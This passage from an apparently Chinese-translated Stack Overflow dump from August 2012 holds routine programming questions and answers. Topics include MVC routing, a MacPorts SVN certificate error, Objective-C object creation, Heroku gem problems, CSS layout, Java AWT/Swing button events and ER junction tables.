但我得到错误：

“找不到资源。”</p>

请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T13:24:55.180

如果这个 //localhost/Ancora/MiniSites/Index/Lilly 正在工作，那么它必须调用控制器 Ancora 中的操作方法 MiniSites 并将 Index 和 Lilly 作为参数传递给它。如果您希望 //LocalHost/Ancora/Lilly 映射到第一个 URL，请尝试以下代码：

```
routes.MapRoute(
    "MiniSite",
    "{controler}/{param2}",
    new { controller = "Ancora", action = "MiniSites", param1 = "Index", param2 = "Lilly" }
); 
```

其中 param1 和 param2 是 Ancora 控制器中操作方法 MiniSites 的参数名称。

# workflow - 通过工作流程保存数据历史的良好做法是什么？

> ID：11751348
> 
> 赞同：1
> 
> 时间：2012-08-01T01:23:21.207
> 
> 标签：workflow, versioning, database-versioning

在我们的团队中，我们需要通过工作流程记录数据。在每一步，当数据发生变化时，我们不希望丢失其先前的状态，因为如果工作流后退一步，则必须恢复先前的状态。

我要问的是，如何实现这一点的最佳实践是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T03:58:13.240

在这里，我找到了一个 pdf 演示文稿和一个网站，用于改进您当前的工作流程数据记录系统和管理的最佳实践。

[PDF 演示文稿](http://www.google.com.sa/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=0CFAQFjAA&url=http://www.sdn.sap.com/irj/scn/go/portal/prtroot/docs/library/uuid/50f1c01b-972d-2c10-3d9d-90887014fafb?overridelayout=true&ei=NKUYUPWiDsTF0QX-94D4Cw&usg=AFQjCNEoMlZv-8XO5CpVd6ht5GaeLsTPfw)

[网站](http://www.google.com.sa/url?sa=t&rct=j&q=&esrc=s&source=web&cd=3&ved=0CFQQFjAC&url=http://www.wf4ever-project.org/wiki/display/docs/Workflow%2bDesign%2bBest%2bPractices&ei=NKUYUPWiDsTF0QX-94D4Cw&usg=AFQjCNHZkYAZCUw9Hvcud15jB_v8fhPBvw)

虽然浏览需要一些时间，但您的努力将是值得的。希望这能解决你的问题。:)

问候，

Ivisire

# clickonce - 有没有办法在控制面板中以编程方式调用卸载程序？

> ID：11751353
> 
> 赞同：0
> 
> 时间：2012-08-01T01:23:39.303
> 
> 标签：clickonce, uninstallation, controlpanel

我为 Outlook 开发了一个插件，我们不想使用 VSTO，但确实想使用 ClickOnce 分发/更新它。所以我构建了一个 ClickOnce 应用程序，它实际上是安装程序/更新程序。当然，这也需要一个自制的卸载程序。

一切都按预期工作，除了一点点粗糙：要完全卸载应用程序，用户必须从开始菜单运行卸载程序*并*从控制面板卸载安装程序/更新程序。

如果我可以从我自己开发的卸载程序代码中启动该控制面板卸载程序，那就太好了。

TIA

# ios - 使用 Foursquare 原生 iPhone 应用进行授权

> ID：11751354
> 
> 赞同：0
> 
> 时间：2012-08-01T01:23:39.427
> 
> 标签：ios, safari, foursquare, url-scheme, authorize

Foursquare 原生 iPhone 应用程序是否可以在不打开 safari 浏览器的情况下处理用于授权的 url 方案？

```
foursquare://authorize/app_ID 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T08:49:17.420

这是不可能的，因为foursquare 目前只支持4 个iPhone URL（[地点、签到、提示和用户](https://developer.foursquare.com/resources/client#iphone)）。

# macos - 无法从 SVN 与 MacPorts 同步

> ID：11751355
> 
> 赞同：5
> 
> 时间：2012-08-01T01:23:51.130
> 
> 标签：macos, svn, sync, macports

运行 10.7.4，我运行了以下命令：

```
mkdir -p /opt/mports
cd /opt/mports
svn checkout https://svn.macports.org/repository/macports/trunk
cd trunk/base
./configure --enable-readline
make
sudo make install
make distclean 
```

然后我跑了`nano /opt/local/etc/macports/sources.conf`，注释掉`rsync://rsync.macports.org/release/tarballs/ports.tar`并添加了`file://opt/mports/trunk/dports [default]`

运行后`sudo port -d sync`我收到

```
DEBUG: Copying /Volumes/Storagestar/Users/themikemasterson/Library/Preferences/com.apple.dt.Xcode.plist to /opt/local/var/macports/home/Library/Preferences
--->  Updating the ports tree
Synchronizing local ports tree from file:///opt/mports/trunk/dports
DEBUG: /usr/bin/svn update --non-interactive /opt/mports/trunk/dports
DEBUG: changing euid/egid - current euid: 0 - current egid: 0
svn: OPTIONS of 'https://svn.macports.org/repository/macports/trunk': Server certificate verification failed: issuer is not trusted (https://svn.macports.org)
Command failed: /usr/bin/svn update --non-interactive /opt/mports/trunk/dports
Exit code: 1
DEBUG: command execution failed
while executing
"system $svn_commandline"
Error: Synchronization of the local ports tree failed doing an svn update
DEBUG: Synchronization of 1 source(s) failed
while executing
"mportsync [array get global_options]"
port sync failed: Synchronization of 1 source(s) failed 
```

通过 rsync 更新可以正常工作，但在使用本地资源时不行。另外，我在开始结账时可以选择接受证书，我选择永久接受它。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-08-07T12:50:38.233

@Vortexfive 提供的答案是对的。照他说的做，**然后从你的主目录复制** `.subversion`到`/opt/local/var/macports/home`：

```
$ sudo bash
# find ~/.subversion/auth -type f -exec rm -f {} \;
# cd /opt/mports/trunk
# svn update     (press 'p' to store the certificate)
# cd /opt/local/var/macports/home
# cp -R ~/.subversion .
# port selfupdate 
```

完毕！

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-14T09:05:33.960

尝试手动执行（与日志文件相同，但没有 --non-interactive）：

```
/usr/bin/svn update /opt/mports/trunk/dports 
```

现在，您应该收到以下消息：

```
Error validating server certificate for 'https://svn.macports.org:443':
 - The certificate is not issued by a trusted authority. Use the
   fingerprint to validate the certificate manually!
Certificate information:
 - Hostname: *.macports.org
 - Valid: from Tue, 22 Feb 2011 17:29:43 GMT until Tue, 18 Mar 2014 23:36:56 GMT
 - Issuer: 07969287, http://certificates.godaddy.com/repository, GoDaddy.com, Inc., Scottsdale, Arizona, US
 - Fingerprint: ...
(R)eject, accept (t)emporarily or accept (p)ermanently? 
```

如果您选择`p`，svn 将在您下次接受 macports 证书时接受`port sync`。

# objective-c - 如果我使用一个属性，这个方法会崩溃，如果我在方法中声明变量，这个方法可以正常工作——为什么？

> ID：11751357
> 
> 赞同：1
> 
> 时间：2012-08-01T01:24:03.980
> 
> 标签：objective-c, ios5, xcode4.3

我正在开发一个可编程计算器，对于我的生活，我无法理解我做错了什么。

以下是代码的相关部分。（代码未完成，所以我知道周围有额外的东西。）

计算器视图控制器.m

```
#import "CalculatorViewController.h"
#import "CalculatorBrain.h"

@interface CalculatorViewController ()
@property (nonatomic) BOOL userIsEnteringNumber;
@property (nonatomic) BOOL numberIsNegative;
@property (nonatomic,strong) CalculatorBrain *brain;
@property (nonatomic) NSArray *arrayOfDictionaries;
@property (nonatomic) NSDictionary *dictionary;
@end

@implementation CalculatorViewController
@synthesize display = _display;
@synthesize history = _history;
@synthesize userIsEnteringNumber = _userIsEnteringNumber;
@synthesize numberIsNegative;
@synthesize brain = _brain;
@synthesize arrayOfDictionaries;
@synthesize dictionary;

-(CalculatorBrain *)brain
{
if (!_brain) _brain = [[CalculatorBrain alloc] init];
return _brain;
}

/*snip code for some other methods*/

- (IBAction)variablePressed:(UIButton *)sender 
{
NSString *var = sender.currentTitle; 
NSDictionary *dict = [self.dictionary initWithObjectsAndKeys:[NSNumber numberWithDouble:3],@"x",[NSNumber numberWithDouble:4.1],@"y",[NSNumber numberWithDouble:-6],@"z",[NSNumber numberWithDouble:8.7263],@"foo",nil];
[self.brain convertVariable:var usingDictionary:dict];
self.display.text = [NSString stringWithFormat:@"%@",var];
self.history.text = [self.history.text stringByAppendingString:sender.currentTitle];
[self.brain pushOperand:[dict objectForKey:var] withDictionary:dict];
}

@end 
```

这是 CalculatorBrain.m。

```
#import "CalculatorBrain.h"

@interface CalculatorBrain ()
@property (nonatomic, strong) NSMutableArray *operandStack;
@end

@implementation CalculatorBrain
@synthesize operandStack = _operandStack;

-(void)pushOperand:(id)operand withDictionary:(NSDictionary *)dictionary
{
NSNumber *operandAsObject;
if (![operand isKindOfClass:[NSString class]])
{
    operandAsObject = operand;
}
else 
{
    operandAsObject = [dictionary objectForKey:operand];
}
[self.operandStack addObject:operandAsObject];
}

-(double)popOperand
{
NSNumber *operandAsObject = [self.operandStack lastObject];
if (operandAsObject) [self.operandStack removeLastObject];
return [operandAsObject doubleValue];
}

-(double)convertVariable:(NSString *)variable usingDictionary:dictionary
{
double convertedNumber = [[dictionary objectForKey:variable] doubleValue];
return convertedNumber;
}

@end 
```

我无法理解的是`CalculatorViewController.m`方法`- (IBAction)variablePressed:(UIButton *)sender`。此行使程序崩溃：

```
NSDictionary *dict = [self.dictionary initWithObjectsAndKeys:[list of objects and keys]]; 
```

但如果我成功了

```
NSDictionary *dict = [[NSDictionary alloc] initWithObjectsAndKeys:[list of objects and keys]]; 
```

然后一切正常。但如果我尝试做

```
NSDictionary *dict = [[self.dictionary alloc] initWithObjectsAndKeys:[list of objects and keys]]; 
```

在我看来这是正确的做法，然后 XCode 不会让我这样做，所以我显然不理解某些东西。

有什么想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T01:43:15.690

`+alloc`为对象分配内存。`-init...`方法初始化对象。

`[self.dictionary initWithObjectsAndKeys:...`调用`-dictionary`将返回该属性中设置的字典或 nil 然后尝试调用`init...`它。如果字典存在，那么您将尝试多次初始化一个无效的对象。如果该属性尚未设置，则 getter 将返回 nil 并且向 nil 发送`init...`消息将什么也不做。无论哪种方式，这都不是您想要做的。

`[[self.dictionary alloc] init...`也是无效的，因为编译器会警告您。现在你尝试从中获取一个对象`-dictionary`，然后调用`+alloc`它的类方法。

这里似乎存在一些关于如何创建对象以及属性访问器做什么的基本混淆。[除了建议查看对象创建](https://developer.apple.com/library/mac/#documentation/General/Conceptual/DevPedia-CocoaCore/ObjectCreation.html#//apple_ref/doc/uid/TP40008195-CH39-SW1)和[点语法](http://developer.apple.com/library/ios/documentation/cocoa/conceptual/objectivec/Chapters/ocObjectsClasses.html#//apple_ref/doc/uid/TP30001163-CH11-SW17)之外，我不确定如何解决这个问题。

# ruby-on-rails - 为什么heroku应用程序崩溃说“没有要加载的文件-nokogiri（LoadError）”？

> ID：11751363
> 
> 赞同：2
> 
> 时间：2012-08-01T01:24:31.000
> 
> 标签：ruby-on-rails, ruby, heroku, nokogiri

我刚刚尝试将我的应用程序部署到 Heroku。它已经工作了很长一段时间，我只是添加了一些新功能。部署后，我收到“应用程序崩溃”错误。`heroku logs`显示`No such file to load -- nokogiri (LoadError)`。

现在，在我的系统上，我`Gemfile.lock`展示了 2 个不同的 nokogiri gems: `nokogiri (~> 1.5.0)`，它是的依赖项`fog (1.4.0)`，`nokogiri (1.5.5-x86-mingw32)`它似乎不是任何东西的依赖项。在平台下是唯一`x86-mingw32`的。我的开发计算机是 Windows 7，`ruby 1.9.3p194`Heroku toolbalt 自己使用的 Ruby 版本是`heroku-toolbelt/2.30.1 (i386-mingw32) ruby/1.9.2`.

我的 Bundler 版本是最新的，我的 Heroku 工具带版本是最新的。我尝试`Gemfile.lock`根据一些论坛帖子的建议删除并重新部署，但应用程序仍然崩溃。

看来 Heroku 根本没有捆绑在正确版本的 nokogiri 中，但由于我使用 Windows 而忽略了它。解决问题的方法是将我添加`gem 'nokogiri', '~> 1.5.5'`到我的 gemfile 中（即使我的应用程序没有明确需要 nokogiri，它只是一个依赖项），然后重新部署到 Heroku 而不`bundle install`先在我自己的系统上运行。现在应用程序不会崩溃。

我不知道为什么会这样。我不知道如何确保问题不再发生，我只是碰巧得到了一个绝望的补丁。我以后不能有这样的停机时间，或者担心在例行部署中再次发生类似的事情。有人可以解释一下到底出了什么问题以及解决它的*正确方法吗？*

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-28T20:27:31.510

添加这个

```
 PLATFORMS
    x86-mingw32 
```

到您的 Gemfile。Heroku 会忽略你的`Gemfile.lock`，因为 windows 有不同的依赖。

# html - css - 将文本与图像边缘水平对齐

> ID：11751365
> 
> 赞同：0
> 
> 时间：2012-08-01T01:24:37.760
> 
> 标签：html, css

我想将帖子的文本与图片的右边缘水平对齐。即在下图中，我希望文字位于黑线的右侧，与图像一致。有点像 twitter 和 facebook 的帖子。

![水平对齐](../Images/43b9afd7124907a330d8c1bddfb3e3c9.png)

我将如何仅使用 css 来做到这一点？谢谢

[编辑]

下面是一些 HTML 和 CSS：

HTML：

```
<div class="post-container"><img class="avatar" src="/static/images/11_48.jpeg"><span class="post"> <b>Daniel</b> 
<p> asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd asdfasd </p> </span>
</div> 
```

CSS：

```
.avatar {
float: left;
margin-right:5px;
vertical-align:text-top;
-webkit-border-radius: 4px;
-khtml-border-radius: 4px;  
-moz-border-radius: 4px;
border-radius: 4px;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T01:29:09.243

将它们放在一个容器内的两个单独的 div 中，都向左浮动并具有适当的宽度（左边应该是图像的宽度，右边应该是空间其余部分的宽度）和高度（100%）。还有很多方法可以做到这一点，但我认为这是最简单和最推荐的一种。

[这里](http://jsfiddle.net/2gTJ9/1/)的例子。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T01:32:12.320

有很多方法可以做到这一点。您可能应该将两者都包装在 a 中，然后通过执行以下操作将文本向右移动：

```
#text {
left: 100px; /* or however far you want it */
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-08-27T08:55:03.807

不需要将图像和段落分隔为 2 个 div。不需要更改类头像中的任何内容。为 p 添加下面的样式。然后你会得到你想要的。

```
.text_align {
    padding-left: 20px; /* or ajust it with your needs */
    margin-left: 20px;
} 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-08-01T01:33:37.170

放上`float: left;`图。例如：

```
img {
    float: left;
} 
```

# c++ - 为什么 C2662 错误不适用于对 std::unique_ptr对象的 const 引用？

> ID：11751367
> 
> 赞同：3
> 
> 时间：2012-08-01T01:25:10.410
> 
> 标签：c++, c++11, constants, unique-ptr

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T01:34:59.710

`const std::unique_ptr<B>`类似于`B* const`，即指向可变对象的不可变指针`B`-not `const B*`，指向不可变对象的可变指针`B`。如果你想从`unique_ptr`版本中得到同样的错误，你需要写`std::unique_ptr<const B>`. 实际上，您正在返回`unique_ptr`by`const`引用，但`B`它所引用的不是`const`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T01:38:10.757

You are returning a const reference from your `getB()` method. You cannot change the address to which a const reference points. Yet calling `get()` on the returned object would give you the pointer. That is not a good thing to try!

# oracle - 调用返回强记录类型的 oracle 存储过程

> ID：11751369
> 
> 赞同：0
> 
> 时间：2012-08-01T01:25:42.223
> 
> 标签：oracle, vb6

我在 oracle 中有一个存储过程，如下所示：

```
PROCEDURE get_protection_details (  
             i_case_key     IN  NUMBER, 
             i_eff_dt       IN  DATE,
             protection_rec OUT protection_rectype
          ) 
```

输出参数是类型记录 - 在包中声明如下：

```
TYPE crms_protection_rectype IS RECORD (
     active_protection_flag VARCHAR2(1)  := NULL,
     protection_type        VARCHAR2(30) := NULL,
     term                   VARCHAR2(30) := NULL,
     protection_fee_name    VARCHAR2(30) := 'PROTECTION'
); 
```

我正在尝试从 VB6 调用它 - 这是我拥有的代码

```
Dim adoCMD As Object
Dim rs as ADODB.recordset

Set adoCMD = CreateObject("ADODB.Command")
adoCMD.ActiveConnection = Me.Cn
adoCMD.CommandText = "fdp$product.get_protection_details"
adoCMD.CommandType = adCmdStoredProc
adoCMD.Parameters.Append adoCMD.CreateParameter("i_case_key", adDouble, adParamInput, 32000, plCaseKey) 
'//this case key is type long and value is 20305003'
adoCMD.Parameters.Append adoCMD.CreateParameter("i_eff_dt", adDate, adParamInput, 32000, Format(Now(), "DD/MM/YYYY"))
rs = adoCMD.Execute 
```

我收到一个错误，说参数数量不正确 - 把我的头发扯到应该很容易的事情上 - 你如何调用一个返回定义记录类型的存储过程？

到处都有以这种方式返回弱游标的示例。

有没有办法以某种方式在 vb6 中定义记录？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T06:38:13.607

这里的问题是你没有定义输出参数。

```
adoCMD.Parameters.Append adoCMD.CreateParameter("protection_rec", adXXXX, adParamOutput, nnnnn) 
```

唯一的问题是，我不知道您是否可以这样做，以及使用什么类型。也许 adLongVarBinary 会起作用，您必须从结果缓冲区中复制大块数据。

为什么不能简单地将数据作为标准记录集返回，即更改存储过程以执行以下操作：

```
SELECT active_protection_flag, protection_type, term, protection_fee_name 
```

如果有充分的理由不更改存储过程的接口，也许您可​​以创建一个包装存储过程，它本质上将输出参数转换为 SELECT 语句。

# c# - 沿对角线移动鼠标

> ID：11751370
> 
> 赞同：0
> 
> 时间：2012-08-01T01:25:50.153
> 
> 标签：c#, math, line, equation

我可以使用哪种数学算法来计算移动鼠标的路径？我只是想拥有这种类型的功能：

```
animateMouseDiag(int X, int Y){
    //Move mouse 1 step towards goal, for loop most likely, from the current Mouse.Position
    Thread.Sleep(1);
} 
```

例如，如果我给它 animateMouseDiag(100,300)，它会将鼠标向右移动 100 并向下移动 300，但在对角线上，而不是在“L”中向右然后向下移动。类似地，如果我给它 (-50,-200)，它将沿着对角线路径将它移动到那些相对坐标（左 50 和上 200）。

谢谢！（顺便说一句，这是一个 alt 帐户，因为我觉得自己像个白痴一样在我的主目录上询问基本的高中数学。我只是无法将其翻译成编程。）

编辑：我想出了这个：

```
public static void animateCursorTo(int toX, int toY)
        {
            double x0 = Cursor.Position.X;
            double y0 = Cursor.Position.Y;

            double dx = Math.Abs(toX-x0);
            double dy = Math.Abs(toY-y0);

            double sx, sy, err, e2;

            if (x0 < toX) sx = 1;
            else sx = -1;
            if (y0 < toY) sy = 1;
            else sy = -1;
            err = dx-dy;

            for(int i=0; i < toX; i++){
                //setPixel(x0,y0)
                e2 = 2*err;
                if (e2 > -dy) {
                    err = err - dy;
                    x0 = x0 + sx;
                }
                if (e2 <  dx) {
                    err = err + dx;
                    y0 = y0 + sy;
                }
                Cursor.Position = new Point(Convert.ToInt32(x0),Convert.ToInt32(y0));
            }
        } 
```

这是[Bresenham 的线算法](http://en.wikipedia.org/wiki/Bresenham%27s_line_algorithm)。奇怪的是，这些线条并没有在设定的角度上绘制。他们似乎被吸引到屏幕的左上角。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T01:28:17.077

将位置坐标存储为浮点值，然后您可以将方向表示为单位向量并乘以特定速度。

```
double mag = Math.Sqrt(directionX * directionX  + directionY * directionY);

mouseX += (directionX / mag) * speed;
mouseY += (directionY / mag) * speed; 
```

# wordpress - Jquery Accordion 菜单插件错误

> ID：11751372
> 
> 赞同：0
> 
> 时间：2012-08-01T01:26:02.580
> 
> 标签：wordpress

[从http://wordpress.org/extend/plugins/jquery-vertical-accordion-menu/](http://wordpress.org/extend/plugins/jquery-vertical-accordion-menu/) 添加 Jquery Accordion 插件后加载网站时出现此错误`jQuery("#dc_jqaccordion_widget-5-item .menu").dcAccordion is not a function`。

我正在使用 WordPress 3.1.4，这是我在 WordPress 中的第一次尝试，我不确定为什么会出现此错误。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T06:57:00.880

这是一个jQuery冲突问题。

**解决方案：**

通过反复试验，一个一个地禁用所有插件，并检查与任何其他插件的冲突。希望这可以帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T03:26:17.060

确保您的主题中有正确的页眉和页脚标签。

将此代码放在您脑海中的标签之前

```
<?php wp_head(); ?> 
```

并将此代码放在页脚中的标记之前

```
<?php wp_footer(); ?> 
```

这可能会解决您的问题

# java - 使用 AWT 按钮并检测是否被点击

> ID：11751375
> 
> 赞同：0
> 
> 时间：2012-08-01T01:26:10.897
> 
> 标签：java, events, user-interface, button, awt

我刚加入，很高兴来到这里~ 所以，今天早上（凌晨 2 点，但除此之外：P）我正在用 JFrame 和其他 GUI 东西做一些 Java 测试。这是我第一次使用 GUI。我正在尝试制作一个小型 Java 应用程序，它可以充当梦想的记者。但是，当我遇到无法解决的问题时，我的进度被冻结了。我的代码如下。

```
import java.awt.*;
import javax.swing.*;
import java.applet.*;

public class Display extends Canvas
{
    static final int WIDTH = 600;
    static final int HEIGHT = 400;
    public static String defaultEntry = "Dreams...";
    public static final String TITLE = "Dream Journal Testing";

    Button erase;

    public static void main(String[] args)
    {
        Display d = new Display();
        d.create();

    }

    public void create()
    {
        JFrame frame = new JFrame();
        System.out.println("Running");

        Panel cardOne = new Panel();
        Panel p1 = new Panel();
        Panel p2 = new Panel();
        Panel p3 = new Panel();
        Panel grid = new Panel();

        cardOne.setLayout(new BorderLayout());
        p1.setLayout(new GridLayout(2,1,3,6));
        TextArea textArea1 = new TextArea(defaultEntry);

        /*Font f1 = new Font("Courier", Font.PLAIN, 16);
        setFont(f1);*/
        Label l1 = new Label("Welcome to the Dream Journal! :)");
    Label l2 = new Label("Type your dream below:");
    p1.add(l1);
    p1.add(l2);

    p2.add(textArea1);

    p3.setLayout(new FlowLayout(FlowLayout.CENTER));

    Button ok = new Button("Save");
    erase = new Button("Erase");
    p3.add(erase);
    p3.add(ok);

    cardOne.add("North",p1);
    cardOne.add("Center",p2);
    cardOne.add("South",p3);

    frame.add(cardOne);
    //frame.add(cardOne);
    //frame.setLocationRelativeTo(null);
    frame.pack();
    frame.setTitle(TITLE);
    frame.setSize(WIDTH, HEIGHT);
    frame.setResizable(false);
    frame.setVisible(true);
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

    System.out.println(textArea1.getText());

}

/*public boolean handleEvent(Event evt)
{
    if(evt.target == erase)
    {
        System.out.println("it works");
        return true;
    }

    else return super.handleEvent(evt);
}
*/  
public boolean action(Event evt, Object arg)
{
    if("Erase".equals(arg))
    {
        System.out.println("hello");
        //textArea1.setText("");
    }
    return true;
}   
} 
```

我遇到的问题是我无法弄清楚如何制作它，因此如果按下“擦除”AWT 按钮，系统将打印一行（作为测试）。我已经尝试过公共布尔操作（事件 evt，对象 arg）和公共布尔句柄事件，但都没有奏效。有人对我这个 Java 菜鸟有什么建议吗？谢谢！！:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T01:59:43.987

一种方法是为按钮添加一个动作监听器（例如 for `Save`）。另一种方法是创建一个`Action`（例如 for `Erase`）。

* * *

除非必要，否则不要将 Swing 与 AWT 组件混合使用。此时甚至不值得学习如何使用 AWT 组件，仅使用 Swing 以获得最佳结果和最佳帮助。

这是该应用程序的一个版本。使用所有 Swing 组件。

```
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;

public class Display 
{
    static final int WIDTH = 600;
    static final int HEIGHT = 400;
    public static String defaultEntry = "Dreams...";
    public static final String TITLE = "Dream Journal Testing";

    JButton erase;

    public static void main(String[] args)
    {
        Display d = new Display();
        d.create();
    }

    public void create()
    {
        JFrame frame = new JFrame();
        System.out.println("Running");

        JPanel cardOne = new JPanel();
        JPanel p1 = new JPanel();
        JPanel p2 = new JPanel();
        JPanel p3 = new JPanel();

        cardOne.setLayout(new BorderLayout());
        p1.setLayout(new GridLayout(2,1,3,6));
        JTextArea textArea1 = new JTextArea(defaultEntry);

        JLabel l1 = new JLabel("Welcome to the Dream Journal! :)");
        JLabel l2 = new JLabel("Type your dream below:");
        p1.add(l1);
        p1.add(l2);

        p2.add(textArea1);

        p3.setLayout(new FlowLayout(FlowLayout.CENTER));

        JButton ok = new JButton("Save");
        ok.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent ae) {
                System.out.println("Do " + ae.getActionCommand());
            }
        });
        erase = new JButton(new EraseAction());
        p3.add(erase);
        p3.add(ok);

        // Use the constants
        cardOne.add(BorderLayout.PAGE_START,p1);
        cardOne.add(BorderLayout.CENTER,p2);
        cardOne.add(BorderLayout.PAGE_END,p3);

        frame.add(cardOne);
        frame.pack();
        frame.setTitle(TITLE);
        frame.setSize(WIDTH, HEIGHT);
        frame.setResizable(false);
        frame.setLocationByPlatform(true);
        frame.setVisible(true);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        System.out.println(textArea1.getText());
    }
}

class EraseAction extends AbstractAction {

    EraseAction() {
        super("Erase");
    }

    @Override
    public void actionPerformed(ActionEvent arg0) {
        System.out.println("Do " + arg0.getActionCommand());
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-01T03:14:55.273

首先让我向您解释一下事件处理程序的基础......

**-**首先，当事件源上发生`Event Source`任何**操作时，都会向****方法**`Event Object`抛出一个。`call back`

 ****-** `Call Back`方法是（接口）**内部的方法，** **需要**由实现此侦听器的方法实现。`Listener`**`Class`**

 ****-**当对事件源执行操作时，此回调方法中的语句将**指示需要做什么。**

**例如：**

认为

```
 Event Source - Button
  When Clicked - Event object is thrown at the call back method
  Call back method - actionPerformed(ActionEvent e) inside ActionListener. 
```

**现在你的情况：**

现在这可以通过两种方式完成......

**1.**让你`Display`类**实现**，`ActionListener`然后**注册**到`button`，`ActionListener`最后**实现ActionListener的抽象方法** `actionPerformed()`。

**例如：**

```
 public class Display extends Canvas implements ActionListener{

    public Display(){

    // Your code....

       setComponent();            // Initializing the state of Components 
     }

    public void setComponent(){

        // Your code.........

       Button b = new Button("Click");
       b.addActionListener(this);        // Registering the button.

       // Your code..........

          }

    public void actionPerformed(ActionEvent event) {

       // Do here whatever you want on the Button Click

     }

  } 
```

**2.**使用`Anonymous`类。

**-**匿名类同时**声明和初始化。**

**-**匿名类**必须实现或扩展**为**只有一个** `interface`或`class`相应的。

您的**Display 类不会在这里实现 ActionListener ....**

```
public class Display extends Canvas {

    public Display(){

    // Your code....

       setComponent();            // Initializing the state of Components 
     }

    public void setComponent(){

        // Your code.........

       Button b = new Button("Click");
                                       // Registering the button and Implementing it

        b.addActionListener(new ActionListener(){

          public void actionPerformed(ActionEvent event) {

                // Do here whatever you want on the Button Click
            }

         }); 

       // Your code..........

          }

  } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-01T01:31:48.993

您需要实施[`ActionListner`](http://docs.oracle.com/javase/7/docs/api/java/awt/event/ActionListener.html)：

```
public class Display extends Canvas implements ActionListener 
```

并将自己添加到您的按钮中：

```
 erase.addActionListener(this); 
```

然后实现所需的方法：

```
public void actionPerformed(ActionEvent event) {
    //do stuff
} 
```

有关更多信息，请查看[有关创建 ActionListeners 的本教程](http://docs.oracle.com/javase/tutorial/uiswing/events/actionlistener.html)。您会发现这种可观察模式在 Java GUI 中被广泛使用。

* * *

几个高水平的批评：

1.  `Button`当有类似但更新的（阅读：更灵活）Swing 组件（即）时，您正在使用许多较旧的 AWT 组件（即`JButton`）。[看一下这个](https://stackoverflow.com/questions/408820/what-is-the-difference-between-swing-and-awt)以快速解释差异。
2.  您实现的事件模型在 1997 年被修改为我上面建议的可观察模式。如果您想了解更多信息，[可以阅读此内容](http://docs.oracle.com/javase/1.3/docs/guide/awt/designspec/events.html)。****

# ios - 实现类似 WWDC 2012 应用程序的事件映射

> ID：11751376
> 
> 赞同：0
> 
> 时间：2012-08-01T01:26:13.690
> 
> 标签：ios, xcode, map, uiimage, wwdc

虽然我没有真正使用过它，但我看到了 WWDC 2012 应用程序的图片，其中每个研讨会在活动地图上都有自己的位置。这只是一个带有针脚的 UIImage 吗？

![在此处输入图像描述](../Images/57fb1700d73700c6d9b5631c0557fe9c.png)

我还发现了这个本地地图启动： http: [//gigaom.com/mobile/wifarers-mobile-app-doesnt-just-map-the-indoors-it-maps-the-objects-within/](http://gigaom.com/mobile/wifarers-mobile-app-doesnt-just-map-the-indoors-it-maps-the-objects-within/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T02:41:39.153

WWDC 的场地总数总是很少——包括实验室在内可能只有 20 个左右。Moscone West只有三层。您当然可以使用一组三张图像和一个叠加在每个场地正确位置的图钉来制作这种地图。这似乎是一个简单的解决方案。

# database-design - 在 ER 模型中绘制多个“多对多”实体

> ID：11751377
> 
> 赞同：0
> 
> 时间：2012-08-01T01:26:30.460
> 
> 标签：database-design, relational-database, visio

在 ER 图中，我将如何建模两个多对多关系

```
 FACILITY
 Facility_ID
 Name
 etc

 PHYSICIAN
 Physician_Id
 Name
 etc

 PATIENT
 Patient_Id
 Name
 etc 
```

M:N - 一个设施可以配备许多医生，一个医生可以受雇于许多设施 MN - 一个患者可以由多个医生治疗，一个医生可以治疗多个患者'

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T01:40:39.973

这是一个常见的关系设计问题。为了解决这个问题，您创建所谓的联结表或关联实体。

以下是一些有用的解释和示例，可以帮助您与您的相关：

[http://en.wikipedia.org/wiki/Associative_Entities](http://en.wikipedia.org/wiki/Associative_Entities)

[http://en.wikipedia.org/wiki/Junction_table](http://en.wikipedia.org/wiki/Junction_table)

在您的情况下，您可能会：

```
 Facilty_Physican
 ----------------
 Facility_ID
 Physician_Id 
```

和

```
 Physican_Patient
 ----------------
 Physician_Id
 Patient_Id 
```

您可能还会发现，有时在数据模型优化中并且根据关系的平衡，一些非规范化联结表。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T01:36:04.657

多对多关系的建模是通过在两个相关表之间制作一个表来完成的，从而将tit分成两个一对多关系。因此：一个 Facility_Physician 表，它有两列都是外键。第一个 FK 引用 Facility_ID，第二列引用 Physician_Id。Patient_Physician 表也是如此。

# android - 自定义 PathEffect 的描边帽

> ID：11751382
> 
> 赞同：1
> 
> 时间：2012-08-01T01:26:55.267
> 
